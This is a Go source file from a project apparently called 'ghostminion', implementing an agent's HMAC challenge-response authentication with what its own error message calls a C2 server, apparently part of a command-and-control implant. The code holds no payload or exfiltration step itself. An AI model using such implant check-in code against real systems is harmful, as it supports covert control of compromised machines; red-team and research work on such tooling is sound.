package communication

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"ghostminion/config"
	"net/http"
)

func CanCommunicate(serverConfig config.ServerConfig) bool {
	agentId := config.GetInstance().AgentID
	challenge, err := getChallenge(agentId, serverConfig)

	if err != nil {
		fmt.Println("Failed to get challenge:", err)
		return false
	}

	hmacValue := computeHMAC(challenge, []byte(serverConfig.Key))

	err = sendResponse(agentId, hmacValue, serverConfig)
	if err != nil {
		fmt.Println("Failed to send response:", err)
		return false
	}

	return true
}

func getChallenge(agentID string, serverConfig config.ServerConfig) (string, error) {
	payload := map[string]string{"agent_id": agentID}
	body, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	headers := map[string]string{
		"Content-Type":     "application/json",
		"X-Requested-With": agentID,
	}

	respBody, status, err := SendRequest(POST, serverConfig.Address+"/auth/challenge", headers, body)
	if err != nil {
		return "", err
	}
	if status != http.StatusOK {
		return "", fmt.Errorf("unexpected status code: %d", status)
	}

	var result struct {
		Challenge string `json:"challenge"`
	}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return "", err
	}

	return result.Challenge, nil
}

func computeHMAC(message string, key []byte) string {
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(message))
	return fmt.Sprintf("%x", mac.Sum(nil))
}

func sendResponse(agentID string, hmac string, serverConfig config.ServerConfig) error {
	payload := map[string]string{
		"agent_id": agentID,
		"hmac":     hmac,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	headers := map[string]string{
		"Content-Type":     "application/json",
		"X-Requested-With": agentID,
	}

	respBody, status, err := SendRequest(POST, serverConfig.Address+"/auth/verify", headers, body)
	if err != nil {
		return err
	}

	if status != http.StatusOK {
		return fmt.Errorf("c2 rejected auth: %s", respBody)
	}

	return nil
}
